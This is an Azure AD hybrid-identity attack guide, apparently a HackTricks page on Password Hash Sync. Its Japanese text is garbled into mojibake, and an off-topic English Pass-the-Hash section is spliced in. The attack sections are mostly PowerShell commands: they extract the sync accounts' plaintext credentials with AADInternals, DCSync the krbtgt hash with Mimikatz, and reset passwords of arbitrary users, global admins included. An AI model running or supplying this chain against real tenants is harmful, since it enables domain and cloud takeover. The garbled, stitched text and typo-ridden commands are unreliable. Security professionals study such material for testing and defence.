# PHS - ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥åŒæœŸ

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’è¦‹ãŸã„**å ´åˆã€ã¾ãŸã¯HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## åŸºæœ¬æƒ…å ±

**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥åŒæœŸ**ã¯ã€ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚µã‚¤ãƒ³ã‚¤ãƒ³æ–¹æ³•ã®1ã¤ã§ã™ã€‚Azure AD Connectã¯ã€ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®Active Directoryã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‹ã‚‰ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®Azure ADã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒãƒƒã‚·ãƒ¥ã‚’åŒæœŸã—ã¾ã™ã€‚

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

ã“ã‚Œã¯ã€ä¼æ¥­ãŒã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ADã‚’Azure ADã¨åŒæœŸã•ã›ã‚‹ãŸã‚ã«æœ€ã‚‚ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹æ–¹æ³•ã§ã™ã€‚

ã™ã¹ã¦ã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã®ãƒãƒƒã‚·ãƒ¥**ãŒã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã‹ã‚‰Azure ADã«åŒæœŸã•ã‚Œã¾ã™ã€‚ãŸã ã—ã€**å¹³æ–‡ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„**å…ƒã®ãƒãƒƒã‚·ãƒ¥**ã¯Azure ADã«é€ä¿¡ã•ã‚Œã¾ã›ã‚“ã€‚\
ã•ã‚‰ã«ã€**ãƒ“ãƒ«ãƒˆã‚¤ãƒ³**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ï¼ˆãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…ãªã©ï¼‰ã¯Azure ADã«**åŒæœŸã•ã‚Œã¾ã›ã‚“**ã€‚

ãƒãƒƒã‚·ãƒ¥ã®åŒæœŸã¯**2åˆ†ã”ã¨**ã«è¡Œã‚ã‚Œã¾ã™ã€‚ãŸã ã—ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Azure ADã§ã¯**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ‰åŠ¹æœŸé™**ã¨**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æœ‰åŠ¹æœŸé™**ã¯**åŒæœŸã•ã‚Œã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæœŸé™åˆ‡ã‚Œ**ï¼ˆå¤‰æ›´ã•ã‚Œã¦ã„ãªã„ï¼‰ã®å ´åˆã§ã‚‚ã€å¤ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦Azureãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ç¶šã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒAzureãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å ´åˆã€**èªè¨¼ã¯Azure ADã§è¡Œã‚ã‚Œã¾ã™**ã€‚

**PHS**ã¯ã€Identity Protectionã‚„AAD Domain Servicesãªã©ã®æ©Ÿèƒ½ã«å¿…è¦ã§ã™ã€‚

## ãƒ”ãƒœãƒƒãƒˆ

PHSãŒæ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã„ãã¤ã‹ã®**ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ãŒè‡ªå‹•çš„ã«**ä½œæˆ**ã•ã‚Œã¾ã™ï¼š

* ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**`MSOL_<installationID>`**ã¯ã€ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ADã§è‡ªå‹•çš„ã«ä½œæˆã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯**Directory Synchronization Accounts**ãƒ­ãƒ¼ãƒ«ï¼ˆ[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)ã‚’å‚ç…§ï¼‰ãŒä»˜ä¸ã•ã‚Œã¦ãŠã‚Šã€ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ADã§**ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆDCSyncï¼‰æ¨©é™**ã‚’æŒã£ã¦ã„ã¾ã™ã€‚
* ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**`Sync_<name of on-prem ADConnect Server>_installationID`**ã¯ã€Azure ADã§ä½œæˆã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯ã€Azure ADã®**ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**ï¼ˆåŒæœŸã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚¯ãƒ©ã‚¦ãƒ‰ã®ã¿ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’**ãƒªã‚»ãƒƒãƒˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

å‰è¿°ã®2ã¤ã®ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ã€**Azure AD ConnectãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒãƒ¼**ã®SQLã‚µãƒ¼ãƒãƒ¼ã«**å¹³æ–‡ã§ä¿å­˜**ã•ã‚Œã¦ã„ã¾ã™ã€‚ç®¡ç†è€…ã¯ã“ã‚Œã‚‰ã®ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¹³æ–‡ã§æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Azure AD ConnectãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒãƒ¼**ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«å‚åŠ ã—ã¦ã„ã‚‹å ´åˆï¼ˆãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§æ¨å¥¨ã•ã‚Œã¦ã„ã‚‹ï¼‰ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### AzureAD -> ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹

In this section, we will discuss the technique of Pass-the-Hash (PtH) attack using Azure AD Connect in a hybrid identity environment. 

#### Introduction

Azure AD Connect is a tool provided by Microsoft that allows synchronization of on-premises Active Directory (AD) with Azure AD. This synchronization enables users to have a single identity across both on-premises and cloud environments. 

#### Password Hash Sync (PHS)

One of the synchronization methods provided by Azure AD Connect is Password Hash Sync (PHS). With PHS, the password hashes of on-premises AD users are synchronized to Azure AD. This allows users to authenticate against Azure AD using the same password they use for on-premises AD. 

#### Exploiting PHS for Lateral Movement

In a hybrid identity environment, where Azure AD is synchronized with on-premises AD using PHS, an attacker can exploit this synchronization to perform lateral movement. 

The attacker can obtain the password hash of an on-premises AD user from Azure AD. This can be done by compromising an account with sufficient privileges in Azure AD or by exploiting vulnerabilities in Azure AD Connect. 

Once the attacker has the password hash, they can use it to authenticate as the on-premises AD user on other systems within the on-premises network. This allows the attacker to move laterally and gain access to sensitive resources within the network. 

#### Mitigation

To mitigate the risk of Pass-the-Hash attacks using Azure AD Connect, the following measures can be taken:

1. Ensure that Azure AD Connect is up to date with the latest security patches and updates.
2. Implement strong access controls and least privilege principles for accounts used by Azure AD Connect.
3. Monitor and log activities related to Azure AD Connect for any suspicious behavior.
4. Regularly review and audit the configuration of Azure AD Connect to ensure it aligns with security best practices.
5. Implement multi-factor authentication (MFA) for Azure AD accounts to add an extra layer of security.

By following these mitigation measures, organizations can reduce the risk of Pass-the-Hash attacks and enhance the security of their hybrid identity environment.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
### ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ -> AzureAD

`Sync_*` ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã§ã€ã‚°ãƒ­ãƒ¼ãƒãƒ«ç®¡ç†è€…ã‚’å«ã‚€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’**ãƒªã‚»ãƒƒãƒˆ**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
**ã‚¯ãƒ©ã‚¦ãƒ‰ã®ã¿ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™**ï¼ˆäºˆæœŸã—ãªã„å ´åˆã§ã‚‚ï¼‰ã€‚
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
### ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹SSO

PTAã¨ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹SSOã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚Šã€ä»–ã®æ‚ªç”¨ã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚ä»¥ä¸‹ã§ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã—ã‚‚ã‚ãªãŸã®**ä¼šç¤¾ã‚’HackTricksã§åºƒå‘Šè¡¨ç¤ºã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã—ã‚‡ã† ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¾ã—ã‚‡ã†ã€‚

</details>
